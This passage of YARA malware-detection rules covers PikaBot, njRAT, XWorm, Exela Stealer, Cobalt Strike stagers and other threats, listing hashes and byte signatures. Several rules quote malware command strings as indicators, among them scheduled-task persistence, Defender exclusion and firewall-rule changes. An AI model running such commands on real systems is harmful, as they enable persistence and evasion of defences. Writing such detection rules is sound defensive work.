		hash = "305de78353b0d599cd40a73c7e639df7f5946d1fc36691c8f7798a99ee6835e7"
		hash = "98c59262ad396b4da5b0a3e82f819923f860e974f687c4fff9b852f25a56c50f"
		hash = "27ec297e1fc34e29963303782ff881e74f8bd4126f4c5be0c4754f745d85f79a"
		hash = "392fd4d218a8e333bc422635e48fdfae59054413c7a6be764c0275752d45ab23"
		hash = "9a34b32d0a66dd4f59aeea82ef48f335913c47c6ca901ab109df702cd166892f"
		logic_hash = "ea9a166550c53225b0a06e2cd86760f63aed8973e889a457470bdba3d87ce6af"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s1 = "xlAutoOpen" wide ascii
		$s2 = { 49 ?? ?? 4c ?? ?? 48 ?? ?? 48 ?? ?? 02 e8 ?? ?? ?? ?? 48 ?? ?? 31 ?? 48 ?? ?? 01 48 ?? ?? 41 ?? ?? ?? ?? 30 ?? 48 ?? ?? 01 49 ?? ?? 75 ?? }

	condition:
		( all of ( $s* ) )
}

rule EMBEERESEARCH_Win_Pikabot_Loader_Bytecodes_Oct_2023
{
	meta:
		description = "Detects bytecodes in recent PikaBot Loaders"
		author = "Matthew @ Embee_Research"
		id = "c15b9390-1d20-5325-81c3-c6cf59ffb21f"
		date = "2023-10-03"
		modified = "2023-10-08"
		reference = "https://github.com/embee-research/Yara-detection-rules/"
		source_url = "https://github.com/embee-research/Yara-detection-rules//blob/ac56d6f6fd2a30c8cb6e5c0455d6519210a8b0f4/Rules/win_pikabot_loader_bytecodes_oct_2023.yar#L3-L24"
		license_url = "N/A"
		hash = "778b6797bb9c9d2f868d3faaaf6b36ce3f06178c133bb592c5345c95ffb034a9"
		hash = "e26d44d740b4edbd37fa6196dcc9171e49e711d8ce64f67aae36c4299e352108"
		hash = "2d212cacc4767ef4383bdf462a9bb8aaf87f0b3c55b4c2f4a47c97c710ec1cd8"
		logic_hash = "a078df39fda5ab6f432c4bf42fb61bdf106386d9684188189e3cea81803b3952"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s1 = { 8b 59 64 a1 58 00 ?? ?? 8b 8e d0 00 00 00 2b c1 2d d9 f1 3e 41 0f af da 09 46 20 a1 34 dd ?? ?? 8b d3 2b 88 a0 00 00 00 2b 0d bc ff ?? ?? 81}
		$s2 = { 88 14 08 8b cb 8b 15 a0 6a ?? ?? 42 c1 e9 08 89 15 a0 6a ?? ?? 8b 46 20 2b 05 ec 6a ?? ?? 05 ae 49 08 00}
		$s3 = { 03 d8 43 a1 d4 8e ?? ?? 33 18 89 1d 18 8f ?? ?? a1 d4 8e ?? ?? 8b 15 18 8f ?? ?? 89 10 8b 45 f8 83 c0 04 89 45 f8 33 c0 a3 14 8f ?? ?? a1 d4 8e ?? ?? 83 c0 04 03 05 14 8f ?? ?? a3 d4 8e ?? ?? 8b 45 f8 3b 05 e0 8e ?? ?? }

	condition:
		$s1 or $s2 or $s3
}

rule EMBEERESEARCH_Win_Mystic_Stealer_Bytecodes_Sep_2023
{
	meta:
		description = "No description has been set in the source file - EmbeeResearch"
		author = "Matthew @ Embee_reserch"
		id = "ef7c51e1-9c8c-5b66-bc1e-f35a796c84f2"
		date = "2023-09-21"
		modified = "2023-11-12"
		reference = "https://github.com/embee-research/Yara-detection-rules/"
		source_url = "https://github.com/embee-research/Yara-detection-rules//blob/ac56d6f6fd2a30c8cb6e5c0455d6519210a8b0f4/Rules/win_mystic_stealer_bytecodes_sep_2023.yar#L1-L29"
		license_url = "N/A"
		hash = "ef9fce75334befe0b435798c0b61dab1239ea5bc62b97654943676dd96dc6318"
		hash = "36d8cb1447e2c5da60d2b86bf29856919c25f8e71a17f1d0d61d03c5e0505e4b"
		hash = "e907c22288dacb37efa07481fef7a0d4ec0ce42954f12b2572ea7f5ffeecf313"
		logic_hash = "f68b6ef307e48b7ff6f944cfcf9c906a83611400af5af7d8621227874356960d"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s1 = {99 d3 d8 c5}
		$s2 = {99 b7 66 df}
		$s3 = {cb 45 92 f8}
		$s4 = {7b cc e1 54}
		$s5 = {7b 9c 29 17}
		$s6 = {01 c4 fb 83}
		$s7 = {b6 0f 74 e3}
		$s8 = {93 58 b5 ee}
		$s9 = {81 d9 df be}
		$s10 = {7b d8 62 00}
		$s12 = {81 d9 df be}
		$s13 = {7b d8 62 00}
		$s14 = {77 4a bc ac}

	condition:
		( all of them )
}

rule EMBEERESEARCH_Win_Stealc_Bytecodes_Oct_2023
{
	meta:
		description = "Bytecodes present in Stealc decoding routine"
		author = "Matthew @ Embee_Research"
		id = "ecac28a0-cd77-5e6a-8af2-59ea62e733bf"
		date = "2023-08-27"
		modified = "2023-10-09"
		reference = "https://github.com/embee-research/Yara-detection-rules/"
		source_url = "https://github.com/embee-research/Yara-detection-rules//blob/ac56d6f6fd2a30c8cb6e5c0455d6519210a8b0f4/Rules/win_stealc_bytecodes_oct_2023.yar#L2-L21"
		license_url = "N/A"
		hash = "74ff68245745b9d4cec9ef3c539d8da15295bdc70caa6fdb0632acdd9be4130a"
		hash = "9f44a4cbc30e7a05d7eb00b531a9b3a4ada5d49ecf585b48892643a189358526"
		logic_hash = "d50f57e32a7f513d92625549fcd139b7fa1e478879283fd61426fcd19d03d296"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s1 = {8b 4d f0 89 4d f8 8b 45 f8 c1 e0 03 33 d2 b9 06 00 00 00 f7 f1 8b e5 5d c2 04 00}

	condition:
		( all of ( $s* ) )
}

rule EMBEERESEARCH_Win_Njrat_Bytecodes_V2_Oct_2023
{
	meta:
		description = ""
		author = "Matthew @ Embee_Research"
		id = "9090574e-7ad4-5207-af8b-7b56f2a1c917"
		date = "2023-10-03"
		modified = "2023-10-08"
		reference = "https://github.com/embee-research/Yara-detection-rules/"
		source_url = "https://github.com/embee-research/Yara-detection-rules//blob/ac56d6f6fd2a30c8cb6e5c0455d6519210a8b0f4/Rules/win_njrat_bytecodes_v2_oct_2023.yar#L5-L27"
		license_url = "N/A"
		hash = "9877fc613035d533feda6adc6848e183bf8c8660de3a34b1acd73c75e62e2823"
		hash = "40f07bdfb74e61fe7d7973bcd4167ffefcff2f8ba2ed6f82e9fcb5a295aaf113"
		logic_hash = "0bdbf5715e3873d96c88a24ba08487af2b798d26cdcd3e35d783ce4828dae775"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s1 = {03 1F 72 2E ?? 03 1F 73 2E ?? 03 1F 74 2E ?? 03 1F 75 2E ?? 03 1F 76 2E ?? }
		$s2 = {0B 14 0C 16 0D 16 13 ?? 16 13 ?? 14}

	condition:
		dotnet.is_dotnet and ( all of ( $s* ) )
}

rule EMBEERESEARCH_Win_Agent_Tesla_Bytecodes_Sep_2023
{
	meta:
		description = "No description has been set in the source file - EmbeeResearch"
		author = "Matthew @embee_research"
		id = "9d1c5010-7c64-5a6a-bf60-35c042732761"
		date = "2023-09-21"
		modified = "2023-09-21"
		reference = "https://github.com/embee-research/Yara-detection-rules/"
		source_url = "https://github.com/embee-research/Yara-detection-rules//blob/ac56d6f6fd2a30c8cb6e5c0455d6519210a8b0f4/Rules/win_agent_tesla_bytecodes_sep_2023.yar#L4-L21"
		license_url = "N/A"
		hash = "ce696cf7a6111f5e7c6781854de04ddc262b6c9b39c059fd5435dfb3b8901f04"
		hash = "afc29232c4989587db2c54b7c9f145fd0d73537e045ece15338582ede5389fce"
		hash = "fba4374163ba25c9dc572f1a5d7f3e46e09531ab964d808f3dde2a19c05a2ee5"
		logic_hash = "1cc40ab16dfa5245b3146e4512509037f540d59e155040a2336a97cd0f42e612"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s1 = {8F ?? ?? ?? ?? 25 47 FE ?? ?? ?? FE ?? ?? ?? 91 61 D2 52 20 ?? ?? ?? ?? FE ?? ?? ?? }

	condition:
		dotnet.is_dotnet and $s1
}

rule EMBEERESEARCH_Win_Xworm_Simple_Strings
{
	meta:
		description = "Detects simple strings present in unobfuscated xworm"
		author = "Matthew @ Embee_Research"
		id = "8d5d8f07-72fa-596b-a3fc-1dee4b7fd058"
		date = "2023-08-30"
		modified = "2023-10-18"
		reference = "https://github.com/embee-research/Yara-detection-rules/"
		source_url = "https://github.com/embee-research/Yara-detection-rules//blob/ac56d6f6fd2a30c8cb6e5c0455d6519210a8b0f4/Rules/win_xworm_simple_strings_sep_2023.yar#L3-L29"
		license_url = "N/A"
		hash = "4459d95c0493d640ecc9453cf6a4f2b7538b1a7b95032f70803fc726b8e40422"
		hash = "820bb1a31f421b90ea51efc3e71cc720c8c2784fb1e882e732e8fafb8631a389"
		logic_hash = "f7df310b24b2078249cdb670ece71ebe30f985c92b3e44b6dcf0e37405a26bc3"
		score = 75
		quality = 75
		tags = ""

	strings:
		$x1 = "XWorm V" wide nocase
		$s1 = "/create /f /RL HIGHEST /sc minute /mo 1 /tn " wide
		$s2 = "/create /f /sc minute /mo 1 /tn " wide
		$s3 = "-ExecutionPolicy Bypass Add-MpPreference -ExclusionPath " wide

	condition:
		dotnet.is_dotnet and $x1 and ( 2 of ( $s* ) )
}

rule EMBEERESEARCH_Win_Njrat_Strings_Oct_2023
{
	meta:
		description = ""
		author = "Matthew @ Embee_Research"
		id = "c89711cb-aae9-5409-80c2-145a8d5fca56"
		date = "2023-10-03"
		modified = "2023-10-03"
		reference = "https://github.com/embee-research/Yara-detection-rules/"
		source_url = "https://github.com/embee-research/Yara-detection-rules//blob/ac56d6f6fd2a30c8cb6e5c0455d6519210a8b0f4/Rules/win_njrat_strings_oct_2023.yar#L3-L25"
		license_url = "N/A"
		hash = "59d6e2958780d15131c102a93fefce6e388e81da7dc78d9c230aeb6cab7e3474"
		logic_hash = "ed36a991aa2699486f1ef34f4f4d559a3dd351180602f017ad7d868e146c703b"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s1 = "netsh firewall delete allowedprogram" wide
		$s2 = "cmd.exe /c ping 0 -n 2 & del" wide
		$s3 = "netsh firewall add allowedprogram" wide
		$s4 = "Execute ERROR" wide
		$s5 = "Update ERROR" wide
		$s6 = "Download ERROR" wide

	condition:
		dotnet.is_dotnet and ( all of ( $s* ) )
}

rule EMBEERESEARCH_Win_Exela_Stealer_Simple_Strings_Sep_2023
{
	meta:
		description = "No description has been set in the source file - EmbeeResearch"
		author = "Matthew @embee_research"
		id = "e63aa1d3-997e-5200-93fc-869c177fe1a8"
		date = "2023-09-24"
		modified = "2023-09-26"
		reference = "https://github.com/embee-research/Yara-detection-rules/"
		source_url = "https://github.com/embee-research/Yara-detection-rules//blob/ac56d6f6fd2a30c8cb6e5c0455d6519210a8b0f4/Rules/win_exela_stealer_simple_strings_sep_2023.yar#L4-L32"
		license_url = "N/A"
		hash = "bf5d70ca2faf355d86f4b40b58032f21e99c3944b1c5e199b9bb728258a95c1b"
		logic_hash = "2312b63fe86fd34eb12f42f079f470eb3af27ef8c199f3620253c828ad28441a"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s1 = "https://i.instagram.com/api/v1/accounts/current_user/" wide
		$s2 = "/create /f /sc onlogon /rl highest /tn \"AutoUpdateCheckerOnLogon\" /tr " wide
		$s4 = "https://discord.com/api/webhooks/" wide
		$s5 = "Browser : {0} | Name : {1} | Value : {2} | Date created (timestamp) : {3} |  Date last used (timestamp) : {4} | Count {5}" wide
		$s6 = "Browser : {0} | {1} {2}/{3} {4}" wide
		$e1 = "Exela.Program" wide ascii
		$e2 = "Exela.Wifi" wide ascii
		$e3 = "Exela.Components" wide ascii
		$e4 = "Exela Stealer" wide ascii
		$e5 = "Exela.exe" wide ascii

	condition:
		dotnet.is_dotnet and ( ( all of ( $s* ) ) or ( 3 of ( $e* ) ) )
}

rule EMBEERESEARCH_Win_Medusa_Bytecodes
{
	meta:
		description = "Medusa Bytecodes"
		author = "Matthew @ Embee_Research"
		id = "48b659f8-cd26-540a-89b6-6349f8d21e8f"
		date = "2023-08-27"
		modified = "2024-03-03"
		reference = "https://github.com/embee-research/Yara-detection-rules/"
		source_url = "https://github.com/embee-research/Yara-detection-rules//blob/ac56d6f6fd2a30c8cb6e5c0455d6519210a8b0f4/Rules/win_medusa_dotnet_bytecodes.yar#L1-L17"
		license_url = "N/A"
		hash = "a1211549b4e1a7befd953d03b4d929b3dc9f25ec6c1bc9c05ae92a0ec08fb77c"
		logic_hash = "aa01afd6981af99625a9fca93e512cc00931aca18e55c5cb6dee11efb9ea2968"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s1 = {1F ?? 8D ?? ?? ?? 01 25 16 72 ?? ?? ?? 70 A2 25 17 72 ?? ?? ?? 70 28 ?? ?? ?? 0A A2 25 18 20 ?? ?? ?? 00 13 04 12 04 28 ?? ?? ?? 0A A2 25 19 20 ?? ?? ?? 00 13 ?? 12 }
		$s2 = "\\Medusa\\obj\\Release\\Medusa.pdb" ascii

	condition:
		$s1 or $s2
}

rule AVASTTI_Cobaltstrike_Raw_Payload_Dns_Stager_X86
{
	meta:
		description = "No description has been set in the source file - AvastTI"
		author = "Avast Threat Intel Team"
		id = "817c4a72-7be1-5a58-987d-fe203d7778ea"
		date = "2021-07-08"
		modified = "2021-07-08"
		reference = "https://github.com/avast/ioc"
		source_url = "https://github.com/avast/ioc/blob/5659f4f0f4e09970c5de29c536ceb500d5634951/CobaltStrike/yara_rules/cs_rules.yar#L1-L26"
		license_url = "N/A"
		logic_hash = "d447fac16f0a712b1c264bc83b4cf2e56e5e98b369617799b981cd75b37c3511"
		score = 75
		quality = 90
		tags = ""

	strings:
		$h01 = { FC E8 89 00 00 00 60 89 E5 31 D2 64 8B 52 30 8B 52 0C 8B 52 14 8B 72 28 }

	condition:
		uint32( @h01 + 0x00a3 ) == 0xe553a458 and uint32( @h01 + 0x00bd ) == 0x0726774c and uint32( @h01 + 0x012f ) == 0xc99cc96a and uint32( @h01 + 0x0198 ) == 0x56a2b5f0 and uint32( @h01 + 0x01a4 ) == 0xe035f044 and uint32( @h01 + 0x01e4 ) == 0xcc8e00f4
}

rule AVASTTI_Cobaltstrike_Raw_Payload_Smb_Stager_X86
{
	meta:
		description = "No description has been set in the source file - AvastTI"
		author = "Avast Threat Intel Team"
		id = "29911a14-08ea-54de-9c07-630c6516bd49"
		date = "2021-07-08"
		modified = "2021-07-08"
		reference = "https://github.com/avast/ioc"
		source_url = "https://github.com/avast/ioc/blob/5659f4f0f4e09970c5de29c536ceb500d5634951/CobaltStrike/yara_rules/cs_rules.yar#L28-L57"
		license_url = "N/A"
		logic_hash = "7459bcb0353f114a869aa61adc0229197ca9a1cfce0741dc227fabbeea2afba9"
		score = 75
		quality = 90
		tags = ""

	strings:
		$h01 = { FC E8 89 00 00 00 60 89 E5 31 D2 64 8B 52 30 8B 52 0C 8B 52 14 8B 72 28 }

	condition:
		uint32( @h01 + 0x00a1 ) == 0xe553a458 and uint32( @h01 + 0x00c4 ) == 0xd4df7045 and uint32( @h01 + 0x00d2 ) == 0xe27d6f28 and uint32( @h01 + 0x00f8 ) == 0xbb5f9ead and uint32( @h01 + 0x010d ) == 0xbb5f9ead and uint32( @h01 + 0x0131 ) == 0xfcddfac0 and uint32( @h01 + 0x0139 ) == 0x528796c6 and uint32( @h01 + 0x014b ) == 0x56a2b5f0
}

rule AVASTTI_Cobaltstrike_Raw_Payload_Tcp_Bind_X86
{
	meta:
		description = "No description has been set in the source file - AvastTI"
		author = "Avast Threat Intel Team"
		id = "ec0a9e27-3650-5393-a93b-2a461b9a0e29"
		date = "2021-07-08"
		modified = "2021-07-08"
		reference = "https://github.com/avast/ioc"
		source_url = "https://github.com/avast/ioc/blob/5659f4f0f4e09970c5de29c536ceb500d5634951/CobaltStrike/yara_rules/cs_rules.yar#L59-L96"
		license_url = "N/A"
		logic_hash = "5c56e1f1d85375f19b6085b3d4654d2d1ba38d3dfcfea66707ca8957a6ed7bf8"
		score = 75
		quality = 90
		tags = ""

	strings:
		$h01 = { FC E8 89 00 00 00 60 89 E5 31 D2 64 8B 52 30 8B 52 0C 8B 52 14 8B 72 28 }

	condition:
		uint32( @h01 + 0x009c ) == 0x0726774c and uint32( @h01 + 0x00ac ) == 0x006b8029 and uint32( @h01 + 0x00bb ) == 0xe0df0fea and uint32( @h01 + 0x00d5 ) == 0x6737dbc2 and uint32( @h01 + 0x00de ) == 0xff38e9b7 and uint32( @h01 + 0x00e8 ) == 0xe13bec74 and uint32( @h01 + 0x00f1 ) == 0x614d6e75 and uint32( @h01 + 0x00fa ) == 0x56a2b5f0 and uint32( @h01 + 0x0107 ) == 0x5fc8d902 and uint32( @h01 + 0x011a ) == 0xe553a458 and uint32( @h01 + 0x0128 ) == 0x5fc8d902 and uint32( @h01 + 0x013d ) == 0x614d6e75
}

rule AVASTTI_Cobaltstrike_Raw_Payload_Tcp_Bind_X64
{
	meta:
		description = "No description has been set in the source file - AvastTI"
		author = "Avast Threat Intel Team"
		id = "3575408a-3309-5723-a49a-9c2088d43de9"
		date = "2021-07-08"
		modified = "2021-07-08"
		reference = "https://github.com/avast/ioc"
		source_url = "https://github.com/avast/ioc/blob/5659f4f0f4e09970c5de29c536ceb500d5634951/CobaltStrike/yara_rules/cs_rules.yar#L98-L133"
		license_url = "N/A"
		logic_hash = "a803a9c76142ccadda5f5c8f6abf78ac9a60523576edf62f4a1600556f4b6261"
		score = 75
		quality = 90
		tags = ""

	strings:
		$h01 = { FC 48 83 E4 F0 E8 C8 00 00 00 41 51 41 50 52 51 56 48 31 D2 65 48 8B 52 }

	condition:
		uint32( @h01 + 0x0100 ) == 0x0726774c and uint32( @h01 + 0x0111 ) == 0x006b8029 and uint32( @h01 + 0x012d ) == 0xe0df0fea and uint32( @h01 + 0x0142 ) == 0x6737dbc2 and uint32( @h01 + 0x0150 ) == 0xff38e9b7 and uint32( @h01 + 0x0161 ) == 0xe13bec74 and uint32( @h01 + 0x016f ) == 0x614d6e75 and uint32( @h01 + 0x0198 ) == 0x5fc8d902 and uint32( @h01 + 0x01b8 ) == 0xe553a458 and uint32( @h01 + 0x01d2 ) == 0x5fc8d902 and uint32( @h01 + 0x01ee ) == 0x614d6e75
}

rule AVASTTI_Cobaltstrike_Raw_Payload_Tcp_Reverse_X86
{
	meta:
		description = "No description has been set in the source file - AvastTI"
		author = "Avast Threat Intel Team"
		id = "ac824189-614d-5bff-9bbb-a4244cace563"
		date = "2021-07-08"
		modified = "2021-07-08"
		reference = "https://github.com/avast/ioc"
		source_url = "https://github.com/avast/ioc/blob/5659f4f0f4e09970c5de29c536ceb500d5634951/CobaltStrike/yara_rules/cs_rules.yar#L135-L164"
		license_url = "N/A"
		logic_hash = "c20de49c3225a7aed8460d0e3cc3bce715c8746fb4313a2faf9da3c8d1d87387"
		score = 75
		quality = 90
		tags = ""

	strings:
		$h01 = { FC E8 89 00 00 00 60 89 E5 31 D2 64 8B 52 30 8B 52 0C 8B 52 14 8B 72 28 }

	condition:
		uint32( @h01 + 0x009c ) == 0x0726774c and uint32( @h01 + 0x00ac ) == 0x006b8029 and uint32( @h01 + 0x00bb ) == 0xe0df0fea and uint32( @h01 + 0x00d5 ) == 0x6174a599 and uint32( @h01 + 0x00e5 ) == 0x56a2b5f0 and uint32( @h01 + 0x00f2 ) == 0x5fc8d902 and uint32( @h01 + 0x0105 ) == 0xe553a458 and uint32( @h01 + 0x0113 ) == 0x5fc8d902
}

rule AVASTTI_Cobaltstrike_Raw_Payload_Tcp_Reverse_X64
{
	meta:
		description = "No description has been set in the source file - AvastTI"
		author = "Avast Threat Intel Team"
		id = "21151a9c-1d15-514f-b33b-c9eff08463fb"
		date = "2021-07-08"
		modified = "2021-07-08"
		reference = "https://github.com/avast/ioc"
		source_url = "https://github.com/avast/ioc/blob/5659f4f0f4e09970c5de29c536ceb500d5634951/CobaltStrike/yara_rules/cs_rules.yar#L166-L195"
		license_url = "N/A"
		logic_hash = "58ae5351bac70ab9530cb033d1f6bb90acb6b66df395d59a55d221ef2a2e5dcf"
		score = 75
		quality = 90
		tags = ""

	strings:
		$h01 = { FC 48 83 E4 F0 E8 C8 00 00 00 41 51 41 50 52 51 56 48 31 D2 65 48 8B 52 }

	condition:
		uint32( @h01 + 0x0100 ) == 0x0726774c and uint32( @h01 + 0x0111 ) == 0x006b8029 and uint32( @h01 + 0x012d ) == 0xe0df0fea and uint32( @h01 + 0x0142 ) == 0x6174a599 and uint32( @h01 + 0x016b ) == 0x5fc8d902 and uint32( @h01 + 0x018b ) == 0xe553a458 and uint32( @h01 + 0x01a5 ) == 0x5fc8d902 and uint32( @h01 + 0x01c1 ) == 0x614d6e75
}

rule AVASTTI_Cobaltstrike_Raw_Payload_Http_Stager_X86
{
	meta:
		description = "No description has been set in the source file - AvastTI"
		author = "Avast Threat Intel Team"
		id = "01f89b14-55f2-5a5e-b0d5-6bca609621fe"
		date = "2021-07-08"
		modified = "2021-07-08"
		reference = "https://github.com/avast/ioc"
		source_url = "https://github.com/avast/ioc/blob/5659f4f0f4e09970c5de29c536ceb500d5634951/CobaltStrike/yara_rules/cs_rules.yar#L197-L232"
		license_url = "N/A"
		logic_hash = "d3c74ff363d113d25d9ecca114dd0872487e713a978da4f94f3cccc2e92943ff"
		score = 75
		quality = 90
		tags = ""

	strings:
		$h01 = { FC E8 89 00 00 00 60 89 E5 31 D2 64 8B 52 30 8B 52 0C 8B 52 14 8B 72 28 }

	condition:
		uint32( @h01 + 0x009c ) == 0x0726774c and uint32( @h01 + 0x00aa ) == 0xa779563a and uint32( @h01 + 0x00c6 ) == 0xc69f8957 and uint32( @h01 + 0x00de ) == 0x3b2e55eb and uint32( @h01 + 0x00f2 ) == 0x7b18062d and uint32( @h01 + 0x010b ) == 0x5de2c5aa and uint32( @h01 + 0x0114 ) == 0x315e2145 and uint32( @h01 + 0x0123 ) == 0x0be057b7 and uint32( @h01 + 0x02c4 ) == 0x56a2b5f0 and uint32( @h01 + 0x02d8 ) == 0xe553a458 and uint32( @h01 + 0x02f3 ) == 0xe2899612
}

rule AVASTTI_Cobaltstrike_Raw_Payload_Http_Stager_X64
{
	meta:
		description = "No description has been set in the source file - AvastTI"
		author = "Avast Threat Intel Team"
		id = "7eeeb2a1-4903-5649-ae30-fd43367ab468"
		date = "2021-07-08"
		modified = "2021-07-08"
		reference = "https://github.com/avast/ioc"
		source_url = "https://github.com/avast/ioc/blob/5659f4f0f4e09970c5de29c536ceb500d5634951/CobaltStrike/yara_rules/cs_rules.yar#L234-L263"
		license_url = "N/A"
		logic_hash = "a89a8e25d894bf7e5c4a10e2a14b78a52543e42fb185667db9f9548f52ef58bf"
		score = 75
		quality = 90
		tags = ""

	strings:
		$h01 = { FC 48 83 E4 F0 E8 C8 00 00 00 41 51 41 50 52 51 56 48 31 D2 65 48 8B 52 }

	condition:
		uint32( @h01 + 0x00e9 ) == 0x0726774c and uint32( @h01 + 0x0101 ) == 0xa779563a and uint32( @h01 + 0x0120 ) == 0xc69f8957 and uint32( @h01 + 0x013f ) == 0x3b2e55eb and uint32( @h01 + 0x0163 ) == 0x7b18062d and uint32( @h01 + 0x0308 ) == 0x56a2b5f0 and uint32( @h01 + 0x0324 ) == 0xe553a458 and uint32( @h01 + 0x0342 ) == 0xe2899612
}

rule AVASTTI_Cobaltstrike_Raw_Payload_Https_Stager_X86
{
	meta:
		description = "No description has been set in the source file - AvastTI"
		author = "Avast Threat Intel Team"
		id = "f1d7e939-92b5-5441-8014-b2390854d059"
		date = "2021-07-08"
		modified = "2021-07-08"
		reference = "https://github.com/avast/ioc"
		source_url = "https://github.com/avast/ioc/blob/5659f4f0f4e09970c5de29c536ceb500d5634951/CobaltStrike/yara_rules/cs_rules.yar#L266-L303"
		license_url = "N/A"
		logic_hash = "c168b6f2ce35e57cd4c572ce40652261df7af7900beab7ffcdae58113cad88c0"
		score = 75
		quality = 90
		tags = ""

	strings:
		$h01 = { FC E8 89 00 00 00 60 89 E5 31 D2 64 8B 52 30 8B 52 0C 8B 52 14 8B 72 28 }

	condition:
		uint32( @h01 + 0x009c ) == 0x0726774c and uint32( @h01 + 0x00af ) == 0xa779563a and uint32( @h01 + 0x00cb ) == 0xc69f8957 and uint32( @h01 + 0x00e7 ) == 0x3b2e55eb and uint32( @h01 + 0x0100 ) == 0x869e4675 and uint32( @h01 + 0x0110 ) == 0x7b18062d and uint32( @h01 + 0x0129 ) == 0x5de2c5aa and uint32( @h01 + 0x0132 ) == 0x315e2145 and uint32( @h01 + 0x0141 ) == 0x0be057b7 and uint32( @h01 + 0x02e9 ) == 0x56a2b5f0 and uint32( @h01 + 0x02fd ) == 0xe553a458 and uint32( @h01 + 0x0318 ) == 0xe2899612
}

rule AVASTTI_Cobaltstrike_Raw_Payload_Https_Stager_X64
{
	meta:
		description = "No description has been set in the source file - AvastTI"
		author = "Avast Threat Intel Team"
		id = "5f9c7426-63be-5049-91fc-63b5c29618bd"
		date = "2021-07-08"
		modified = "2021-07-08"
		reference = "https://github.com/avast/ioc"
		source_url = "https://github.com/avast/ioc/blob/5659f4f0f4e09970c5de29c536ceb500d5634951/CobaltStrike/yara_rules/cs_rules.yar#L306-L337"
		license_url = "N/A"
		logic_hash = "cb36d75efcd0e76bf96793863d1aa5145237ec3ce5c7195e679f2e1019d5bbab"
		score = 75
		quality = 90
		tags = ""

	strings:
		$h01 = { FC 48 83 E4 F0 E8 C8 00 00 00 41 51 41 50 52 51 56 48 31 D2 65 48 8B 52 }

	condition:
		uint32( @h01 + 0x00e9 ) == 0x0726774c and uint32( @h01 + 0x0101 ) == 0xa779563a and uint32( @h01 + 0x0123 ) == 0xc69f8957 and uint32( @h01 + 0x0142 ) == 0x3b2e55eb and uint32( @h01 + 0x016c ) == 0x869e4675 and uint32( @h01 + 0x0186 ) == 0x7b18062d and uint32( @h01 + 0x032b ) == 0x56a2b5f0 and uint32( @h01 + 0x0347 ) == 0xe553a458 and uint32( @h01 + 0x0365 ) == 0xe2899612
}

rule AVASTTI_Cobaltstrike_Raw_Payload_Dns_Stager_X86_Utf16
{
	meta:
		description = "No description has been set in the source file - AvastTI"
		author = "Avast Threat Intel Team"
		id = "d148ca33-b233-519d-8ba4-d389de721d15"
		date = "2021-07-08"
		modified = "2021-07-08"
		reference = "https://github.com/avast/ioc"
		source_url = "https://github.com/avast/ioc/blob/5659f4f0f4e09970c5de29c536ceb500d5634951/CobaltStrike/yara_rules/cs_rules.yar#L339-L354"
		license_url = "N/A"
		logic_hash = "3519d2af99a159483ba22cd87907bcc87bea1cfc2fb92f5f0334fff1c385ef00"
		score = 75
		quality = 90
		tags = ""

	strings:
		$h01 = { FC 00 E8 00 89 00 00 00 00 00 00 00 60 00 89 00 E5 00 31 00 D2 00 64 00 8B 00 52 00 30 00 8B 00 52 00 0C 00 8B 00 52 00 14 00 8B 00 72 00 28 }

	condition:
		uint32( @h01 + 0x0149 ) == 0xe5005300 and uint32( @h01 + 0x017d ) == 0x07002600 and uint32( @h01 + 0x0261 ) == 0xc9009c00 and uint32( @h01 + 0x0333 ) == 0x5600a200 and uint32( @h01 + 0x034b ) == 0xe0003500 and uint32( @h01 + 0x03cb ) == 0xcc008e00
}

rule AVASTTI_Cobaltstrike_Raw_Payload_Smb_Stager_X86_Utf16
{
	meta:
		description = "No description has been set in the source file - AvastTI"
		author = "Avast Threat Intel Team"
		id = "d88e050f-9e6c-5349-b809-ad7dc25a79b9"
		date = "2021-07-08"
		modified = "2021-07-08"
		reference = "https://github.com/avast/ioc"
		source_url = "https://github.com/avast/ioc/blob/5659f4f0f4e09970c5de29c536ceb500d5634951/CobaltStrike/yara_rules/cs_rules.yar#L356-L373"
		license_url = "N/A"
		logic_hash = "74c50e1c989167ea6d9309e2b53629c7103484faa809a80e90b7d5c318b2370c"
		score = 75
		quality = 90
		tags = ""

	strings:
		$h01 = { FC 00 E8 00 89 00 00 00 00 00 00 00 60 00 89 00 E5 00 31 00 D2 00 64 00 8B 00 52 00 30 00 8B 00 52 00 0C 00 8B 00 52 00 14 00 8B 00 72 00 28 }

	condition:
		uint32( @h01 + 0x0145 ) == 0xe5005300 and uint32( @h01 + 0x018b ) == 0xd400df00 and uint32( @h01 + 0x01a7 ) == 0xe2007d00 and uint32( @h01 + 0x01f3 ) == 0xbb005f00 and uint32( @h01 + 0x021d ) == 0xbb005f00 and uint32( @h01 + 0x0265 ) == 0xfc00dd00 and uint32( @h01 + 0x0275 ) == 0x52008700 and uint32( @h01 + 0x0299 ) == 0x5600a200
}

rule AVASTTI_Cobaltstrike_Raw_Payload_Tcp_Bind_X86_Utf16
{
	meta:
		description = "No description has been set in the source file - AvastTI"
		author = "Avast Threat Intel Team"
		id = "7f17985d-b245-5e95-9b35-af669aafc263"
		date = "2021-07-08"
		modified = "2021-07-08"
		reference = "https://github.com/avast/ioc"
		source_url = "https://github.com/avast/ioc/blob/5659f4f0f4e09970c5de29c536ceb500d5634951/CobaltStrike/yara_rules/cs_rules.yar#L375-L396"
		license_url = "N/A"
		logic_hash = "2c5ac98ffbea197d14cd6e508729885b5f86adbace0a6d978664908e070965cf"
		score = 75
		quality = 90
		tags = ""

	strings:
		$h01 = { FC 00 E8 00 89 00 00 00 00 00 00 00 60 00 89 00 E5 00 31 00 D2 00 64 00 8B 00 52 00 30 00 8B 00 52 00 0C 00 8B 00 52 00 14 00 8B 00 72 00 28 }

	condition:
